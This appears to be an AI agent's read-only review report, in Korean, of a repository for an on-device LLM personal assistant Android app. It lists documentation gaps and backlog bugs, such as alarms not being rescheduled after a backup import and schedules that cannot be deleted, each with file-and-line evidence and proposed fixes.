### docs-8 · README 가 '재현 실험'으로 내세우는 실험실 안내문이 9월 초에 멈춰 있고, 지금 쓰는 환경·회귀 세트 설명이 없다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 포트폴리오: '실측으로 결정한다'가 이 프로젝트의 핵심 주장이고 README 가 그 증거로 이 폴더를 연결한다. 들어가 보면 안내문은 없는 가상 환경 경로, 5개라던 툴, '이 폴더는 깃에 안 올린다'는 틀린 말을 하고, 정작 지금도 매 회차 돌리는 회귀 세트는 설명이 없다. '다시 돌릴 수 있나?'라는 면접 질문에 무엇이 공개 자료만으로 돌아가고(회귀 세트 + 테스트가 내보내는 프롬프트) 무엇이 개인 대화 자료가 필요해 안 돌아가는지 답할 문서가 없다. 유지보수: 미추적 결과 파일이 git add -A 에 섞여 들어갈 수 있다.
- 제안: 스크립트는 건드리지 않고(일회용이라는 결정 그대로) 안내문만 다시 쓴다: ① 무엇을 위한 곳인가 ② 준비 — 파이썬 환경(패키지 이름과 지금 쓰는 버전을 적은 requirements 파일 하나, 옛 0.15.0 잠금 파일은 지우거나 '기록'으로 표시), 모델 파일, 프롬프트를 내보내는 테스트 한 번 ③ 지금도 살아 있는 것 = 회귀 세트(run.py·baseline.json 쓰는 법, 묶음 이름 뜻) ④ exp*.py 는 '그때의 기록 — 지금 프롬프트로는 그대로 안 돌 수 있고 일부는 공개하지 않는 실제 대화 자료가 필요하다'고 분명히 ⑤ 번호별 결과는 표를 다시 만들지 말고 변경 이력·결정 기록으로 링크. .gitignore 71줄을 'scratch/lab/regression/last_run*.json' 으로 넓히고, pull_device_state.sh 의 기본 경로는 환경 변수나 PATH 의 adb 로. 루트 README 30줄의 '재현 실험'은 '실험 기록과 회귀 세트'로 낮춰 쓴다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/scratch/lab/README.md:19,45-62 — 실행 예가 모두 '../.venv/Scripts/python.exe'. AGENTS.md §2-⑤ 는 miniforge 의 friday 환경을 절대 경로로 부르라고 한다(마지막 수정 2026-09-03)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/scratch/lab/README.md:28,39 — '선언하는 툴 5종', 'scratch/ 는 .gitignore 대상'(지금은 scratch/lab 의 스크립트 173개가 추적된다). 실험 표는 21번까지만(지금 104번까지)이고 회차마다 돌리는 고정 회귀 세트(scratch/lab/regression/run.py)는 한 줄도 없다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/scratch/lab/requirements-0.15.0.lock — 'litert-lm-api==0.15.0', 'mediapipe==1.0.0'. 지금 런타임은 0.19(gradle/libs.versions.toml 의 litertlm = 0.19.0)이고 현행 환경 명세 파일은 없다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/scratch/lab/pull_device_state.sh:13 — 다른 PC 의 경로 /c/Users/J/AppData/… 가 기본값
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/.gitignore:71 — 'scratch/lab/regression/last_run.json' 만 무시. 지금 git status 에 'scratch/lab/regression/last_run_019_off.json' 이 미추적으로 떠 있다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/README.md:30 과 .agents/04_MODEL_EVIDENCE.md:39-40 — 각각 '재현 실험 scratch/lab/', '실험실 사용법은 scratch/lab/README.md' 로 이 안내문을 가리킨다
- 검증: scratch/lab/README.md 마지막 커밋 2026-09-03. 19·45-62줄 실행 예가 전부 '../.venv/Scripts/python.exe'(AGENTS.md §2-⑤ 는 miniforge friday 절대 경로). 28줄 '선언하는 툴 5종', 39줄 'scratch/ 는 .gitignore 대상'(지금 git ls-files scratch/lab 은 185개). 안내문에서 'regression' 검색 0건인데 scratch/lab/regression/run.py·baseline.json 이 있고 AGENTS.md 가 매 회차 돌리라고 한다. 실험 스크립트는 exp103 까지 확인(152개). requirements-0.15.0.lock 만 있고 현행 명세 없음(런타임은 gradle/libs.versions.toml:29 의 0.19.0). pull_device_state.sh:13 기본값 /c/Users/J/…(환경 변수 ADB 로 덮을 수 있어 위험은 낮음). .gitignore 는 'scratch/lab/regression/last_run.json' 만 무시(실제 줄은 69줄 부근)하고 git status 에 last_run_019_off.json 이 미추적 — AGENTS.md §1 의 'git add -A 전 확인' 위험과 맞닿는다. .agents/04_MODEL_EVIDENCE.md:39-40 이 이 안내문을 가리킨다. 스크립트는 건드리지 않고 안내문만 고치는 제안이라 '실험 스크립트는 일회용' 결정과 충돌하지 않는다.
- 앞선 기록: AGENTS.md §2-⑤(실행 환경 friday, 실험 스크립트는 일회용, 회귀 세트는 예외로 고정). 실험실 안내문 갱신 기록 없음

### docs-9 · README 에 실제 휴대폰에서 돈다는 증거와 핵심 수치 표, 빌드·실행 방법이 없다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 처음 보는 면접관이 README 에서 1분 안에 확인하고 싶은 것은 '정말 휴대폰에서 도나, 얼마나 빠른가, 내가 돌려 볼 수 있나'다. 지금은 화면이 전부 테스트가 그린 그림이고 속도 숫자가 없어, 좋은 실측이 결정 기록 깊숙이에만 있다. 보안 관련 한계가 언어 항목 안에 묻혀 있어 '저장 데이터는 어떻게 지키나'를 찾는 사람이 놓친다.
- 제안: ① '수치로 보기' 작은 표를 '한눈에' 아래에 둔다 — 글자 생성 속도, 첫 글자까지 걸리는 시간(준비됨/안 됨), 깨우는 시간, 메모리, 테스트 건수, 회귀 세트 통과 — 각 칸에 '약'과 근거 문서 링크(숫자를 여러 곳에 베끼지 않도록 README 한 곳에만). ② 실기기에서 깨끗이 초기화한 뒤 합성 대화로 찍은 20~30초 화면 녹화 하나(일정 승인, 기억 찾기)를 넣는다 — 휴대폰을 쓰는 일이라 사용자에게 무엇·왜·몇 분인지 먼저 묻고, 실사용 시작 초기화 직후가 적당하다. ③ '돌려 보기' 5줄: 요구 사양, 빌드 명령, 모델 파일 넣는 곳, 에뮬레이터는 느리지만 됨, 검증 명령 — 자세한 것은 사용 안내로 링크. ④ 69줄 문단을 셋으로 나눈다: 언어 / 저장 데이터 보호 / 활동 기록 변경 감지.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/README.md:14-21 — 화면 4장이 모두 '합성 데이터로 테스트가 그린 것'. 실기기 화면·영상은 없다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/README.md:25-69 — 속도 수치가 하나도 없다(메모리 약 6.5~7GB, 깨우는 데 약 10초뿐)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/architecture.md:2220-2221 — 이미 잰 값이 있다: 휴대폰 글자 생성 속도 '끔 약 17 / 켬 약 31 / 적응형 약 33 토큰/초'(추측 디코딩)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/checklists/device_gate.md:363 — '미리 준비된 턴 첫 글자 0.68초, 없을 때 6.15초'. docs/CHANGELOG.md:392 — 메모리 6.46~6.97GB. docs/CHANGELOG.md:399 — 테스트 972건·회귀 세트 묶음별 점수
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/README.md:128-139 — 빌드·실행 방법 절이 없다(사용 안내 2·8장에만 있음). 0.39.x 로드맵 43줄대가 'README 에 요구 사양·에뮬레이터 실행법'을 할 일로 적었었다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/README.md:69 — '한·영 언어 지원 및 교차 언어 검색 한계' 한 문단 안에 저장 데이터 보호(별도 DB 암호화 없음)와 활동 기록 변경 감지의 한계가 같이 묻혀 있다
- 검증: README.md:15-21 화면 4장이 app/src/test/screenshots 의 그림이고 21줄 '합성 데이터로 테스트가 그린 것'. README 전체에서 속도 수치는 없다('초'가 나오는 곳은 39줄 음성 30초, 63줄 '깨우는 데 약 10초'뿐, 토큰/초 0건). 이미 잰 값은 docs/architecture.md:2220 '끔 약 17 / 켬 약 31 / 적응형 약 33 토큰/초', docs/checklists/device_gate.md:363 '첫 글자 0.68초 / 6.15초'. README.md:126-139 에 빌드·실행 절 없음. README.md:69 한 문단에 언어·저장 데이터 보호(ADR-032)·활동 기록 사슬 한계(ADR-039)가 함께 들어 있는 것도 확인. 결함이 아니라 포트폴리오 단계(6단계)의 일이라 지금 급하지는 않다. 실기기 녹화는 휴대폰이 실사용 기기이므로 무엇·왜·몇 분을 먼저 물어야 하고, 수치 표는 '약'과 링크로만 써야 한다(AGENTS.md §1).
- 앞선 기록: docs/plans/0.39.x-roadmap.md:48,119 'README 정리 — 요구 사양·에뮬레이터 실행법'(README 본문에는 빌드·실행 절 없음). 수치 표·실기기 영상 기록 없음

### docs-10 · 사람이 읽는 결정 설명이 10월까지의 여섯 편에서 멈춰, 11월의 굵은 결정들은 긴 결정 기록 원문으로만 남아 있다
- 판정 확인됨 · 중요도 낮음 · 크기 M
- 왜: 포트폴리오: 면접에서 요즘 가장 많이 묻는 주제(자료 속 지시 주입 방어, 검색 붙이기 방식 선택, 가정을 다시 재서 뒤집은 일, '모델 탓으로 보였지만 앱 결함'이었던 디버깅)가 바로 11월 기록에 있는데, 사람이 읽는 판이 없어 2천 줄짜리 원문에서 찾아 읽어야 한다. 이미 여섯 편의 틀(문제·기각한 가설·확정·대가·예상 질문)이 잘 잡혀 있어 같은 틀로 옮기기만 하면 된다.
- 제안: 같은 틀로 2~3편을 더 쓴다(새 실험 없이 기록만으로): 07 '자료 속 숨은 지시 — 무엇을 막고 무엇을 못 막나', 08 '문서 검색 — 앱이 붙여 주기 대신 모델이 부르는 툴로', 09 '둘 다 잡아줘가 하나만 되던 문제 — 모델이 아니라 앱이었다'(또는 추측 디코딩을 다시 잰 이야기). README '풀어 낸 문제'에 한 줄씩 잇는다. 01번 문서의 '13개'는 숫자를 빼고 테스트 이름 링크로 바꾼다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/decisions/README.md:6-13 — 여섯 편 목록. 가장 늦은 주제가 0.38.6~0.39.2(10월 말)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/README.md:44-59 — '풀어 낸 문제' 다섯 항목도 같은 범위
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/architecture.md:2207-2225 — 추측 디코딩을 켠 결정: 데모 앱이 뺐다는 이유로 안 쓰던 것을 다시 재서 약 2배 속도
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/architecture.md:2226-2257 — 문서 검색: 앱이 먼저 찾아 붙이는 방식이 실패한 모양과 모델이 부르는 툴로 간 이유
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/architecture.md:2286-2298 — 자료 속 숨은 지시 방어와 '못 막는 것'의 정직한 기록
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/CHANGELOG.md:56-60 — 0.42.7 '원인은 모델이 아니라 앱이었다'(모델은 호출 2개를 냈는데 앱이 첫 것만 실행)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/docs/decisions/01-gpu-digit-corruption.md:73 — '13개 불변식'이라 적었지만 테스트 파일(app/src/test/java/com/kosmos/app/core/TokenBudgetInvariantTest.kt)의 @Test 는 16개 — 베낀 숫자가 낡은 예
- 검증: docs/decisions/README.md:6-13 여섯 편, 가장 늦은 것이 06(CHANGELOG 0.38.6~0.39.2). README.md:44-59 '풀어 낸 문제' 다섯 항목도 같은 범위. docs/decisions/01-gpu-digit-corruption.md:73 '13개 불변식'인데 TokenBudgetInvariantTest.kt 의 @Test 는 16개 — 베낀 숫자가 낡은 것이 확인됨(이 한 줄은 작고 확실한 교정). 추가 2~3편 쓰기는 결함이 아니라 포트폴리오 단계의 선택 사항이다. architecture.md 2226-2298줄(문서 검색·숨은 지시 방어)과 CHANGELOG 56-60줄 본문은 직접 읽지 않았고, 2218-2222줄(추측 디코딩 실측)만 확인했다.
- 앞선 기록: docs/plans/0.39.x-roadmap.md:44-48 '지금 바로(포트폴리오)' — 여섯 편의 출발점. 그 뒤 추가 계획 기록 없음

<details><summary>읽은 범위</summary>

읽기 전용으로 진행했고 파일·git 상태를 바꾸지 않았다(gradle·adb·파이썬 실행 없음, 그래프 도구는 쓰지 않고 grep·파일 읽기·git ls-files 만 사용). 모든 경로는 저장소 루트 C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday 기준 절대 경로다.

[전부 읽은 것] README.md, AGENTS.md(주입분), docs/README.md, docs/DOCUMENTATION_GUIDE.md, docs/plans/README.md, docs/decisions/README.md 와 01·05·06, .agents/00_README.md·04_MODEL_EVIDENCE.md, docs/agent_workflow_guide.md, docs/testing-notes.md, docs/guide/USER_GUIDE.md·USER_GUIDE.en.md(줄 단위 대조), docs/architecture.md 1~1262줄(1~14절 전부), docs/plans/0.39.x-roadmap.md·0.42.10·0.43.0, docs/checklists/real_use_start.md·v0_acceptance.md, scratch/lab/README.md, .gitignore, LICENSE.md.

[일부만 읽은 것] docs/architecture.md 15절(결정 기록 40개) — 제목 전부와 보충·정정 표지, 36·37·40번 본문만 읽었다(나머지 본문은 줄이 길어 잘라 봄). docs/CHANGELOG.md — 0.42.5~0.42.10 과 0.41.6 본문, 나머지는 제목·grep('다음 후보'·'전체 흐름'·문서 관련 기록). docs/PRD.md — 1~140줄과 개정·모순 지점 grep. docs/api_spec.yaml — 머리 40줄과 경로 목록. docs/checklists/device_gate.md — 절 제목, 미완료 85·완료 133 개수, 끝 25줄. docs/decisions/02·03·04 — 낡은 표현 grep 만. docs/expand.md·trouble_shooting.md·nvidia_skills_analysis.md·tasks.md·DESIGN.md·design/·archive/ — 머리말과 상태만. docs/plans 의 나머지 계획서는 상태 줄만(완료가 아닌 것은 접음 1·보류 2·상태 줄 없음 1(0.41.13-argon-prompt.md)뿐 — 잘 관리됨).

[못 읽은 것] documents/v0 의 PDF 3개(이름·크기만), docs/design 의 HTML 목업 2개, build/ 폴더(무시 대상). GitHub 에서 실제로 어떻게 보이는지는 이 환경에서 확인하지 못했다 — docs-1 의 512KB·384KB 한도는 GitHub 문서에 대한 내 기억이라 confidence 를 medium 으로 두었다.

[확인해서 문제 없던 것] scratch/lab 의 실험 출력(exp*_out/err)·실제 대화 파생 자료는 추적되지 않는다(추적 185개 = 스크립트 173 + 안내문·합성 픽스처·기준값 등 12). README 의 화면 4장·라이선스 파일 링크는 모두 존재하고 추적된다. README 의 모듈 의존 그림은 각 build.gradle.kts 와 일치한다. README·주요 문서의 상대 링크는 깨진 것이 없다. README 의 문서 검색 수치(약 19/20, 1위 적중 약 절반)는 결정 기록 37번과 일치한다. Kotlin·AGP·LiteRT-LM 배지는 버전 카탈로그와 일치한다.

[10건을 넘겨 뺀 것 — 5건]
1. 자동 검증(CI) 없음 — .github 폴더가 없어 '게이트 녹색' 주장을 밖에서 확인할 길이 없다. 뺀 이유: 화면 기준 이미지 비교가 기본으로 켜져 있어(gradle.properties:8 roborazzi.test.verify=true) 다른 운영체제에서 글꼴 차이로 깨질 수 있고, 따로 설계가 필요한 아이디어라 문서 영역 10건보다 뒤로 뒀다.
2. 상류(Google) 보고 — scratch/lab/upstream_issue_draft.md 가 초안으로만 남아 있고 보낸 기록이 없다(CHANGELOG 1193줄 '상류 보고 준비'). 0.42.8 의 두 엔진 GPU 공존 문제도 보고감이다. 사용자가 직접 해야 하는 바깥 행동이라 뺐다.
3. docs/checklists/device_gate.md 제목이 '(누적, 0.20 ~ 0.35)'인데 내용은 0.42.x 까지 — 사소함.
4. docs/plans/0.39.x-antigravity-runbook.md 가 저장소에 없는 개인 메모 파일 12개로 링크(깨짐) — 끝난 계획서라 영향 작음.
5. 코드에 CC BY-NC 4.0 을 쓰는 것(소프트웨어용 라이선스가 아님) — 사용자 선택으로 보여 제안하지 않았다.

[일부러 내지 않은 것] 릴리스 빌드·서명·로그 제거, 화면에서 민감 값 가리기, 브랜치·PR, 실험 스크립트 되살리기 등 이미 내려진 결정을 뒤집는 제안은 없다. 10건 모두 모델 입력(툴 선언·시스템 지시·리마인더·툴 결과 문구)을 건드리지 않는다. docs-6 의 api_spec.yaml 이동은 테스트의 파일 경로 수정이 따르고, docs-7 은 추적 파일 삭제라 둘 다 실행 전 사용자 확인이 필요하다.

</details>

## 알려진 후보·실사용 빈틈 (backlog)

### backlog-1 · 끝낼 방법이 없는 일정·이미 울린 알림이 쌓여 아침 브리핑과 '오늘' 탭의 할 일을 밀어낸다
- 판정 확인됨 · 중요도 높음 · 크기 S · 모델 입력
- 왜: 일정으로 저장된 행은 완료시킬 화면이 없고, 알림은 울려도 '완료 안 됨'으로 남는다. 그래서 '완료 안 됨' 목록은 쓸수록 지난 일정·울린 알림으로 채워진다. 이 목록을 최신순 20건만 읽는 아침 브리핑은 하루 일정·알림 서너 개 기준 약 일주일이면 '미완료 할 일' 칸이 지난 일정·울린 알림으로만 차고, 할 일 탭에 직접 적어 둔 할 일은 밀려난다(0.42.10 기록은 '할 일 탭의 할 일은 아침 브리핑만 본다'고 적었는데 그 유일한 통로가 막힌다). 같은 목록을 100건만 읽는 일정 화면 '오늘' 탭도 한 달쯤 뒤부터 오래전에 적은 할 일이 조용히 사라진다(할 일 탭·위젯 숫자에는 남아 서로 어긋남). 실사용 첫 달 안에 부딪히는 결함이다. 브리핑 글이 실제로 어떻게 나오는지는 재지 않았다(코드 경로만 확인).
- 제안: (1) '오늘' 탭은 이미 있는 '일정을 뺀 남은 할 일' 조회(getPendingTodosData)로 바꾸고 화면 쪽 거르기는 알림 여부만 남긴다 — 모델과 무관, 테스트 한 건 추가. (2) 브리핑 재료도 같은 조회로 바꾸고, 이미 울린 알림(remindedAtMs 있음)은 빼거나 '어제 울린 알림'처럼 따로 표시할지 사용자에게 묻는다. (3) 더 근본적으로는 시작 시각이 지난 일정 행을 '완료 안 됨' 목록에서 빼는 조건을 DAO 조회에 넣는다(스키마 변경 없음). 브리핑 입력이 달라지므로 브리핑 한두 번 생성해 글을 확인한다(채팅 고정 토큰 몫과는 무관).
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/data/src/main/java/com/kosmos/app/data/local/db/dao/TaskDao.kt:17-18 — getPendingTasks 는 '완료 안 됨' 전부를 만든 시각 최신순으로 LIMIT 만큼만 돌려준다(일정 행·알림 행 포함)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/briefing/MorningBriefingGenerator.kt:190-191, 217 — 브리핑의 '미완료 할 일' 재료가 getPendingTasksData(0, 20) 그대로(일정·알림을 거르지 않음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/GenerateBriefingUseCase.kt:117, 152-153 — 그 목록을 제목만 '[미완료 할 일]' 아래에 싣는다(오늘 일정은 [오늘 일정]에도 있어 두 번 들어감)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/calendar/CalendarViewModel.kt:100, 194-196 — '오늘' 탭도 getPendingTasksData(0, 100) 을 읽은 뒤
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/calendar/TodaySchedule.kt:76 — 그 100건 안에서 날짜·알림 없는 것만 골라 보여 준다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/calendar/CalendarViewModel.kt:104-112 및 feature/memory/MemoryViewModel.kt:81, 132-148 — 완료 처리는 날짜 없는 할 일 줄에서만 부를 수 있다(일정 행은 완료·삭제 경로가 없음, updateCompletion 호출처는 이 두 곳뿐)
- 검증: 직접 확인: TaskDao.kt:17-18 getPendingTasks 는 완료 안 됨·취소 안 됨 전부를 createdAt 최신순 LIMIT. MorningBriefingGenerator.kt:190-191(MAX_TASKS=20, :217) 이 그대로 받아 GenerateBriefingUseCase.kt:117 에서 제목만 '[미완료 할 일]'로 싣는다(152-153). CalendarViewModel.kt:100 은 100건(TODAY_TASK_LIMIT :194-196)만 읽고 TodaySchedule.kt:76 이 그 안에서 날짜·알림 없는 것만 고른다. updateCompletion 호출처는 CalendarViewModel.kt:107(날짜 없는 할 일 줄 — CalendarScreen.kt:182)과 MemoryViewModel.kt:134·158 뿐이라 일정 행(dueDateIso 있음)은 완료시킬 길이 없다 — 재현 경로 성립. 고칠 세부: (1) 제목의 '끝낼 방법이 없는 … 울린 알림'은 과장 — 울린 알림은 dueDateIso 가 없어 할 일 탭(getPendingTodos, TaskDao.kt:25-26)에 보이고 거기서 체크할 수 있다. 끝낼 길이 전혀 없는 것은 일정 행뿐. (2) 같은 유형의 숨은 상한이 하나 더 있다: GetTodayScheduleUseCase.kt:97 이 getPendingTasksData(0, 1000) 로 일정을 읽는다(당장은 아님). (3) 브리핑 입력은 채팅 고정 토큰과 무관한 부수 추론 입력이지만 모델 입력이긴 하므로 브리핑 글 확인은 필요. 브리핑이 실제로 지난 일정을 '할 일'로 말하는지는 재지 않았다(코드 경로만).
- 앞선 기록: CHANGELOG 0.38.3(TaskDao.kt:23-24 주석과 같은 내용 — 화면·위젯·개수에서만 일정을 빼고 아침 브리핑·오늘 일정은 전체 조회를 그대로 쓰기로 함). CHANGELOG 0.42.10 '할 일 탭의 할 일은 아침 브리핑만 본다(최대 20)'. 지난 일정·울린 알림이 쌓여 밀어내는 문제 자체는 기록 없음.

### backlog-2 · 알림 예약을 되살리는 곳이 재부팅뿐이라, 백업 가져오기·강제 종료 뒤에는 알림이 울리지 않는다
- 판정 확인됨 · 중요도 높음 · 크기 S
- 왜: 시스템 알람 예약은 기기 재부팅과 앱 '강제 종료' 때 지워진다. 앱은 재부팅 때만 다시 건다. (가) 백업을 가져오면 DB 가 바뀌어 가져온 알림들에는 걸린 알람이 하나도 없다 — 새 휴대폰으로 옮기거나 예전 백업으로 되돌린 뒤 다음 재부팅까지 알림이 전부 조용히 안 울린다(화면·채팅 '알림 뭐 있어'에는 그대로 보여 사용자는 모른다). (나) 설정의 강제 종료, adb 강제 종료(0.42.8 휴대폰 확인에서도 했다), 개발 도구의 실행 버튼 뒤에도 같다 — 디버그 빌드로 매일 쓰며 고치는 지금 방식에서 자주 생길 수 있다. '3시에 알려줘'가 말없이 안 울리는 것은 비서의 핵심 약속이 깨지는 일이다. 덧붙여 정확 알람 권한이 없는 설치(안드로이드 14 이상 새 설치의 기본, 나중에 서명 키를 바꿔 다시 깔 때도 초기화됨)에서는 대체 예약이 절전 중 10분보다 훨씬 늦어질 수 있는데 코드 주석은 '±10분 창'이라고만 적혀 있다.
- 제안: 앱 시작(KosmosApp.onCreate)에서 입출력 스레드로 restoreAll 을 한 번 부른다 — 같은 알림은 같은 자리에 덮어 예약되므로 여러 번 불러도 안전하고, 지난 알림은 지금 로직대로 한 번 울린다. 다만 가져온 백업에 오래된 미발화 알림이 많으면 한꺼번에 울리므로 '하루 넘게 지난 것은 울리지 않고 울림 처리만' 같은 상한을 사용자에게 묻는다. 테스트: 가짜 저장소로 시작 시 예약 호출 확인(HiltTestApplication 은 onCreate 를 부르지 않아 기존 테스트에 영향 없음). 대체 예약은 setAndAllowWhileIdle 로 바꾸고 주석을 사실대로 고친다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/alarm/ReminderAlarmScheduler.kt:65-82 — restoreAll(저장된 알림을 다시 예약, 지난 것은 바로 울림)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/alarm/ReminderBootReceiver.kt:34 — restoreAll 을 부르는 곳은 재부팅 수신기 하나뿐(전체 검색으로 확인)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/KosmosApp.kt:86-97 — 앱 시작(onCreate)은 위젯만 다시 그리고 알림 예약은 건드리지 않는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/memory/MemoryViewModel.kt:322-339 — 백업 가져오기 성공 시 하는 일은 '다음 시작 때 위젯 갱신' 표시뿐
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/data/src/main/java/com/kosmos/app/data/local/file/ExportImportManager.kt:173-184 — 가져오기는 DB 파일을 통째로 바꾼다(알림 행의 id 가 바뀜)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/alarm/ReminderAlarmScheduler.kt:45-56 — 정확 알람 권한이 없을 때의 대체 예약이 setWindow(절전 중에는 시스템이 다음 유지 창까지 미룸)
- 검증: 직접 확인: restoreAll 정의 ReminderAlarmScheduler.kt:65-82, 호출처는 ReminderBootReceiver.kt:34 하나뿐(app·domain·data main 전체 grep, 나머지는 주석). 수신기는 BOOT_COMPLETED 만 받는다(ReminderBootReceiver.kt:30, AndroidManifest.xml:146). KosmosApp.onCreate(86-97)는 widgetRefresher.refreshIfPending 만 하고 알림 스케줄러를 참조하지 않는다(KosmosApp.kt 에 scheduler 관련 문자열 없음). MemoryViewModel.kt:322-339 가져오기 성공 시 refreshOnNextStart 뿐, ExportImportManager.kt:173-184 는 DB 파일 통째 교체. 따라서 새 기기로 옮긴 백업의 알림은 다음 재부팅까지 예약이 없다. 강제 종료가 알람을 지우는 것은 안드로이드 동작이며, 이 저장소는 휴대폰 확인에서 강제 종료를 실제로 쓴다(device_gate.md:371). 앱 시작 때 restoreAll 을 불러도 fire() 가 remindedAtMs 를 다시 확인하고(ReminderFireHandler.kt:47) 같은 requestCode 로 덮어 예약되므로(ReminderAlarmScheduler.kt:89-92) 멱등 — 제안이 성립한다. 주의할 세부: 같은 기기에서 예전 백업으로 되돌린 경우는 id 가 같은 알림의 기존 알람이 살아 있어 일부는 울린다(주장의 '전부'는 새 기기·강제 종료 뒤에 해당). 창 알람(setWindow, :52·55)이 절전 중 미뤄질 수 있다는 지적은 맞지만 부차적이며 주석(:98-100)·NotificationAccess.kt:28 의 '최대 10분' 표현만 고치면 되는 수준.
- 앞선 기록: CHANGELOG 0.21.0(정확 알람·재부팅 복원을 직접 진다, 권한 없으면 창 알람). CHANGELOG 0.41.14·0.42.10(복원 뒤 위젯 갱신, 초기화 때 예약 알림 취소 확인). 가져오기·강제 종료 뒤 알림 재예약은 CHANGELOG·architecture·plans·device_gate 에서 찾지 못함.

### backlog-3 · 한번 승인한 일정은 앱 어디에서도 고치거나 지울 수 없다 (채팅·화면 모두)
- 판정 확인됨 · 중요도 높음 · 크기 M
- 왜: 작은 모델이라 날짜·시각을 틀리게 잡은 일정을 무심코 승인하는 일은 반드시 생긴다(승인 시트가 60초 뒤 닫히는 흐름). 그런데 앱 일정은 알림과 달리 수정 시트도 삭제 버튼도 없고, 지우는 길은 설정의 '할 일 전체 초기화'뿐이다. 기기 캘린더 앱에서 지우거나 시간을 옮겨도 앱 안의 사본은 남아 '오늘 일정 뭐 있어?'·아침 브리핑·위젯에 계속 틀린 일정으로 나오고, 시간을 옮긴 경우 제목은 같고 시각이 달라 두 번 보인다. 매일 쓰면 며칠 안에 부딪히고, 면접에서 '잘못 넣은 일정은 어떻게 지우나요?'에 답이 없다. 모델은 지우기 요청에 '못 한다'고 정직하게 답하므로(실측 기록) 급한 것은 화면 쪽이다.
- 제안: 모델 입력을 건드리지 않는 화면 경로부터: 일정 줄(오늘·다가오는·월 탭, 채팅 결과 카드)을 누르면 알림 수정 시트와 같은 모양의 시트를 열어 [지우기](되돌리기 스낵바) [시각 바꾸기]를 준다. 지우기는 앱 사본을 지우고 위젯을 갱신한다. 기기 캘린더 쪽은 (가) 추가할 때 받은 이벤트 id 를 할 일 행에 저장해(새 열 + Room 마이그레이션) 함께 지우거나, (나) 처음엔 '기기 캘린더에서도 지워 주세요' 안내만 — 사용자 결정. 채팅으로 지우기·고치기(툴 추가)는 토큰 여유가 없어 뒤로 둔다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/tool/ToolNames.kt:10-19 — 툴은 일정 추가·조회, 메모 저장·검색, 위키, 알림 추가·목록, 문서 검색 8개뿐(수정·삭제 없음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/tool/CalendarTool.kt:10-13 — 기기 캘린더 계약이 읽기·넣기 둘뿐
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/AddScheduleUseCase.kt:57-70 — 기기 캘린더에 넣고 돌려받은 이벤트 id 를 버린다(나중에 짝을 찾을 수 없음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/calendar/CalendarScreen.kt:179, 299-312 — '오늘' 탭에서 누를 수 있는 줄은 알림뿐, 일정 줄·다가오는 일정 줄은 누름 동작 없음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/calendar/MonthCalendar.kt:319-325 — 월 탭의 일정 줄도 누름 동작 없음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/memory/MemoryViewModel.kt:81, 199-212 — 삭제 버튼이 있는 할 일 탭은 일정 행을 아예 보여 주지 않는다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/GetTodayScheduleUseCase.kt:136-139 — 기기 일정과의 겹침 제거는 (제목, 시작 시각)이 같을 때만
